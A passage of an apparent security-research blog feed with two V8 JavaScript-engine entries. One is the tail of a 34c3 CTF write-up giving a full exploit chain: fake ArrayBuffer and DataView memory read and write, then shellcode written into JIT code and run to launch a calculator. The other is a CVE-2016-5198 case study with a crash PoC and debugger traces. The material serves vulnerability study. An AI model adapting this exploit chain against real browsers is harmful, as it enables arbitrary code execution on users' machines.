</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> v = arr[<span class="number">0</span>];</span><br><span class="line">    callback();</span><br><span class="line">    arr[<span class="number">0</span>] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab_map_obj = [</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,</span><br><span class="line">    <span class="number">6.73490047e-316</span>,</span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,   <span class="comment">// use ut32.prototype replace it</span></span><br><span class="line">    <span class="number">-1.1263976280432204e+129</span>,</span><br><span class="line">    <span class="number">0.0</span></span><br><span class="line">];</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> ab=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x00000000082003ff)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">arr0=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// leak arraybuffer的prototype和constructor</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr0[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr0, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr0,evil_r0)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr0,evil_r0));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ab_proto_addr=<span class="built_in">parseInt</span>(read_obj_addr(ab.__proto__));</span><br><span class="line">print(<span class="string">"要被leak的ArrayBuffer"</span>);</span><br><span class="line">%DebugPrint(ab);</span><br><span class="line">print(ab_proto_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_constructor_addr = ab_proto_addr - <span class="number">0x1b0</span>;</span><br><span class="line">print(ab_constructor_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">ab_map_obj[<span class="number">0x3</span>]=<span class="keyword">new</span> Int64(ab_proto_addr).asDouble();</span><br><span class="line">ab_map_obj[<span class="number">0x4</span>]=<span class="keyword">new</span> Int64(ab_constructor_addr).asDouble();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"要leak出的ab_map_obj的数组"</span>);</span><br><span class="line">%DebugPrint(ab_map_obj);</span><br><span class="line"><span class="comment">// leak ab_map_obj的地址</span></span><br><span class="line"></span><br><span class="line">arr1=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr1</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr1[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr1, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print(Int64.fromDouble(trigger(arr1,evil_r1)).toString(16));</span></span><br><span class="line">    re=Int64.fromDouble(trigger(arr1,evil_r1));</span><br><span class="line">    <span class="comment">// while(1);</span></span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ab_map_obj_addr = read_obj_addr1(ab_map_obj);</span></span><br><span class="line">ab_map_obj_addr = <span class="built_in">parseInt</span>(read_obj_addr1(ab_map_obj))+<span class="number">0x70</span>;</span><br><span class="line">print(ab_map_obj_addr.toString(<span class="number">16</span>));</span><br><span class="line">ab_map_obj_addr = <span class="keyword">new</span> Int64(ab_map_obj_addr).asDouble();</span><br><span class="line"><span class="comment">// print("float is " + (new Int64(0x001900c60f00000a)).asDouble().toString());</span></span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab = [</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    ab_map_obj_addr,</span><br><span class="line">    <span class="number">3.4766779039175e-310</span>, <span class="comment">/* buffer length 0x4000*/</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span>,<span class="comment">//backing store,先随便填一个数</span></span><br><span class="line">    <span class="number">3.477098183419809e-308</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">arr2=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr2</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr2[<span class="number">0</span>] = object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr2, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr2,evil_r2));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"要leak出的fake_ab的数组"</span>);</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line">fake_ab_float_addr=<span class="built_in">parseInt</span>(read_obj_addr2(fake_ab))+<span class="number">0x70</span>;</span><br><span class="line">print(fake_ab_float_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">fake_ab_float_addr=<span class="keyword">new</span> Int64(fake_ab_float_addr).asDouble();</span><br><span class="line"></span><br><span class="line">arrr=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_obj_addr</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_w0</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arrr[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">        %DebugPrint(arrr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger2(arrr, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,<span class="number">1.1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print("arrr first is");</span></span><br><span class="line">    <span class="comment">// %DebugPrint(arrr);</span></span><br><span class="line">    trigger2(arrr,evil_w0,fake_ab_float_addr);</span><br><span class="line">&#125;</span><br><span class="line">write_obj_addr(fake_ab_float_addr);</span><br><span class="line">print(<span class="string">"arrr last is"</span>);</span><br><span class="line">%DebugPrint(arrr);</span><br><span class="line"><span class="comment">//DataView(ArrayBuffer buffer [, 字节起始位置 [, 长度]]);</span></span><br><span class="line">fake_dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arrr[<span class="number">0</span>],<span class="number">0</span>,<span class="number">0x4000</span>);</span><br><span class="line">%DebugPrint(fake_dv);</span><br><span class="line"></span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"><span class="keyword">var</span> evil_f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"var a = 1000000"</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line">print(<span class="string">"要read的function"</span>);</span><br><span class="line">%DebugPrint(evil_f);</span><br><span class="line">arr3=[<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read_obj_addr3</span>(<span class="params">object</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evil_r3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        arr3[<span class="number">0</span>] = object;</span><br><span class="line">        %DebugPrint(arr3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">        trigger(arr3, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    re=Int64.fromDouble(trigger(arr3,evil_r3));</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line">shellcode_address_ref=<span class="built_in">parseInt</span>(read_obj_addr3(evil_f))+<span class="number">0x38</span><span class="number">-1</span>;</span><br><span class="line">print(shellcode_address_ref.toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="comment">// read function code address</span></span><br><span class="line">fake_ab[<span class="number">4</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">fake_ab[<span class="number">5</span>]=<span class="keyword">new</span> Int64(shellcode_address_ref).asDouble();</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"></span><br><span class="line">shellcode_address =  fake_dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line">shellcode_address=shellcode_address+<span class="keyword">new</span> Int64(<span class="number">0x5f</span>).asDouble();</span><br><span class="line">print(Int64.fromDouble(shellcode_address).toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_ab[<span class="number">4</span>]=shellcode_address;</span><br><span class="line">fake_ab[<span class="number">5</span>]=shellcode_address;</span><br><span class="line">%DebugPrint(fake_ab);</span><br><span class="line"><span class="comment">// while(1);</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> value = shellcode[i];</span><br><span class="line">fake_dv.setUint32(i * <span class="number">4</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"go to shellcode!"</span>);</span><br><span class="line">evil_f();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;34c3-v9-writeup&quot;&gt;&lt;a href=&quot;#34c3-v9-writeup&quot; class=&quot;headerlink&quot; title=&quot;34c3 v9 writeup&quot;&gt;&lt;/a&gt;34c3 v9 writeup&lt;/h1&gt;&lt;p&gt;很久之前做的了，和*CTF那题差不多
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>case study:cve-2016-5198</title>
    <link href="http://eternalsakura13.com/2019/04/29/CVE-2016-5198/"/>
    <id>http://eternalsakura13.com/2019/04/29/CVE-2016-5198/</id>
    <published>2019-04-29T05:34:45.220Z</published>
    <updated>2019-04-29T05:35:16.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="case-study-cve-2016-5198"><a href="#case-study-cve-2016-5198" class="headerlink" title="case study:cve-2016-5198"></a>case study:cve-2016-5198</h1><h2 id="bugs"><a href="#bugs" class="headerlink" title="bugs"></a>bugs</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=659475" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=659475</a><br><a href="https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/2bd7464ec1efc9eb24a38f7400119a5f2257f6e6</a></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    n.xyz = <span class="number">0x826852f4</span>;</span><br><span class="line">    <span class="built_in">parseInt</span>(<span class="string">'AAAAAAAA'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Ctor();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">2000</span>; ++i) &#123;</span><br><span class="line">    Check();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Ctor();</span><br><span class="line">Check();</span><br><span class="line">print(<span class="string">"finish"</span>);</span><br></pre></td></tr></table></figure><h2 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a>漏洞表现</h2><h3 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h3><h4 id="优化前"><a href="#优化前" class="headerlink" title="优化前"></a>优化前</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz &#x3D; 0x826852f4;</span><br><span class="line">parseInt(&#39;AAAAAAAA&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--- Code ---</span><br><span class="line">0x35680eb86a00     0  55             push rbp</span><br><span class="line">0x35680eb86a01     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86a04     4  56             push rsi</span><br><span class="line">0x35680eb86a05     5  57             push rdi</span><br><span class="line">0x35680eb86a06     6  488b4f2f       REX.W movq rcx,[rdi+0x2f]</span><br><span class="line">0x35680eb86a0a    10  488b490f       REX.W movq rcx,[rcx+0xf]</span><br><span class="line">0x35680eb86a0e    14  83411b01       addl [rcx+0x1b],0x1</span><br><span class="line">0x35680eb86a12    18  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86a19    25  7305           jnc 32  (0x35680eb86a20)</span><br><span class="line">0x35680eb86a1b    27  e8c0bef5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86a20    32  48b80000000002000000 REX.W movq rax,0x200000000</span><br><span class="line">0x35680eb86a2a    42  e8b1d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a2f    47  50             push rax</span><br><span class="line">0x35680eb86a30    48  48b8e9c362be00370000 REX.W movq rax,0x3700be62c3e9    ;; object: 0x3700be62c3e9 &lt;Number: 2.18788e+09&gt;</span><br><span class="line">0x35680eb86a3a    58  5a             pop rdx</span><br><span class="line">0x35680eb86a3b    59  48b919b062be00370000 REX.W movq rcx,0x3700be62b019    ;; object: 0x3700be62b019 &lt;String[3]: xyz&gt;</span><br><span class="line">0x35680eb86a45    69  48bf0000000004000000 REX.W movq rdi,0x400000000</span><br><span class="line">0x35680eb86a4f    79  e80cb8f0ff     call 0x35680ea92260     ;; code: STORE_IC</span><br><span class="line">0x35680eb86a54    84  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a58    88  48b80000000008000000 REX.W movq rax,0x800000000</span><br><span class="line">0x35680eb86a62    98  e879d9ffff     call 0x35680eb843e0     ;; code: LOAD_GLOBAL_IC</span><br><span class="line">0x35680eb86a67   103  50             push rax</span><br><span class="line">0x35680eb86a68   104  49ba112330abf6000000 REX.W movq r10,0xf6ab302311    ;; object: 0xf6ab302311 &lt;undefined&gt;</span><br><span class="line">0x35680eb86a72   114  4152           push r10</span><br><span class="line">0x35680eb86a74   116  49ba39b062be00370000 REX.W movq r10,0x3700be62b039    ;; object: 0x3700be62b039 &lt;String[8]: AAAAAAAA&gt;</span><br><span class="line">0x35680eb86a7e   126  4152           push r10</span><br><span class="line">0x35680eb86a80   128  48ba0000000006000000 REX.W movq rdx,0x600000000</span><br><span class="line">0x35680eb86a8a   138  488b7c2410     REX.W movq rdi,[rsp+0x10]</span><br><span class="line">0x35680eb86a8f   143  b801000000     movl rax,0x1</span><br><span class="line">0x35680eb86a94   148  e8a7ddffff     call 0x35680eb84840     ;; code: CALL_IC</span><br><span class="line">0x35680eb86a99   153  488b75f8       REX.W movq rsi,[rbp-0x8]</span><br><span class="line">0x35680eb86a9d   157  4883c408       REX.W addq rsp,0x8</span><br><span class="line">0x35680eb86aa1   161  498b45a0       REX.W movq rax,[r13-0x60]</span><br><span class="line">0x35680eb86aa5   165  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86aaf   175  83430bd1       addl [rbx+0xb],0xd1</span><br><span class="line">0x35680eb86ab3   179  791f           jns 212  (0x35680eb86ad4)</span><br><span class="line">0x35680eb86ab5   181  50             push rax</span><br><span class="line">0x35680eb86ab6   182  e8a5bdf5ff     call InterruptCheck  (0x35680eae2860)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86abb   187  58             pop rax</span><br><span class="line">0x35680eb86abc   188  48bbc9c462be00370000 REX.W movq rbx,0x3700be62c4c9    ;; object: 0x3700be62c4c9 Cell for 6144</span><br><span class="line">0x35680eb86ac6   198  49ba0000000000180000 REX.W movq r10,0x180000000000</span><br><span class="line">0x35680eb86ad0   208  4c895307       REX.W movq [rbx+0x7],r10</span><br><span class="line">0x35680eb86ad4   212  c9             leavel</span><br><span class="line">0x35680eb86ad5   213  c20800         ret 0x8</span><br></pre></td></tr></table></figure><h4 id="优化后"><a href="#优化后" class="headerlink" title="优化后"></a>优化后</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">--- Raw source ---</span><br><span class="line">() &#123;</span><br><span class="line">n.xyz &#x3D; 0x826852f4;</span><br><span class="line">parseInt(&#39;AAAAAAAA&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--- Optimized code ---</span><br><span class="line">optimization_id &#x3D; 1</span><br><span class="line">source_position &#x3D; 50</span><br><span class="line">kind &#x3D; OPTIMIZED_FUNCTION</span><br><span class="line">name &#x3D; Check</span><br><span class="line">stack_slots &#x3D; 5</span><br><span class="line">compiler &#x3D; crankshaft</span><br><span class="line">Instructions (size &#x3D; 186)</span><br><span class="line">0x35680eb86c80     0  55             push rbp</span><br><span class="line">0x35680eb86c81     1  4889e5         REX.W movq rbp,rsp</span><br><span class="line">0x35680eb86c84     4  56             push rsi</span><br><span class="line">0x35680eb86c85     5  57             push rdi</span><br><span class="line">0x35680eb86c86     6  4883ec08       REX.W subq rsp,0x8</span><br><span class="line">0x35680eb86c8a    10  488b45f8       REX.W movq rax,[rbp-0x8]</span><br><span class="line">0x35680eb86c8e    14  488945e8       REX.W movq [rbp-0x18],rax</span><br><span class="line">0x35680eb86c92    18  488bf0         REX.W movq rsi,rax</span><br><span class="line">0x35680eb86c95    21  493ba5600c0000 REX.W cmpq rsp,[r13+0xc60]</span><br><span class="line">0x35680eb86c9c    28  7305           jnc 35  (0x35680eb86ca3)</span><br><span class="line">0x35680eb86c9e    30  e83dbcf5ff     call StackCheck  (0x35680eae28e0)    ;; code: BUILTIN</span><br><span class="line">0x35680eb86ca3    35  48b8c1bd62be00370000 REX.W movq rax,0x3700be62bdc1    ;; object: 0x3700be62bdc1 PropertyCell for 0x18b675545e1 &lt;a Set with map 0xae15ff0c391&gt;</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x288d1c42b999: [PropertyCell]</span><br><span class="line"> - value: 0x28212078a219 &lt;a Set with map 0x1fdb7e106509&gt;</span><br><span class="line"> - details: (data, dictionary_index: 138, attrs: [WE_])</span><br><span class="line"> - cell_type: ConstantType (StableMap)</span><br><span class="line">...</span><br><span class="line">0x35680eb86cad    45  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F;取出JSSet n</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x28212078a219: [JSSet]</span><br><span class="line"> - map &#x3D; 0x1fdb7e106509 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x288d1c415e49</span><br><span class="line"> - elements &#x3D; 0x2089c5182241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS] - table &#x3D; 0x28212078a239 &lt;FixedArray[13]&gt;</span><br><span class="line"> - properties &#x3D; &#123;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line">0x35680eb86cb1    49  49ba0000805e0a4de041 REX.W movq r10,0x41e04d0a5e800000</span><br><span class="line">0x35680eb86cbb    59  c4c1f96ec2     vmovq xmm0,r10</span><br><span class="line">...</span><br><span class="line">0x41e04d0a5e800000 --d2ull-&gt; 0x00000000826852f4</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc0    64  488b4007       REX.W movq rax,[rax+0x7] &#x2F;&#x2F; 取n的自定义属性数组</span><br><span class="line">...</span><br><span class="line">0x0000393bb3086cc4 in ?? ()</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x2089c5182241: [FixedArray]</span><br><span class="line"> - length: 0</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x28212078a219-1</span><br><span class="line">0x28212078a218:0x00001fdb7e1065090x00002089c5182241</span><br><span class="line">0x28212078a228:0x00002089c5182241</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc4    68  488b400f       REX.W movq rax,[rax+0xf] &#x2F;&#x2F; 取n的xyz域</span><br><span class="line">&#x2F;&#x2F; 因为当JSSet对象n进行初始化时，由于尚没有其他的自定义属性存在，因此该位置将使用内置对象empty_fixed_array进行初始化。</span><br><span class="line">&#x2F;&#x2F; 让我们看一下empty_fixed_array</span><br><span class="line">0x2089c5182240:0x000007f3e4882309-&gt;FIXED_ARRAY_TYPE Map0x0000000000000000</span><br><span class="line">0x2089c5182250:0x000007f3e4882361-&gt;initial_string map0x00000000803b1506</span><br><span class="line">0x2089c5182260:0x00000004000000000xdeadbeed6c6c756e</span><br><span class="line">...</span><br><span class="line">gdb-peda$ job $rax</span><br><span class="line">0x7f3e4882361: [Map]</span><br><span class="line"> - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2089c5182311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x2089c5182231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x2089c5182201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x2089c5182241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line">...</span><br><span class="line">0x35680eb86cc8    72  c5fb114007     vmovsd [rax+0x7],xmm0 &#x2F;&#x2F;重新赋值，破坏了initial_string map的结构，于是在后面ParseInt字符串的时候会crash</span><br><span class="line">...</span><br><span class="line">对比一下赋值前后</span><br><span class="line">前:</span><br><span class="line">gdb-peda$ x&#x2F;20gx 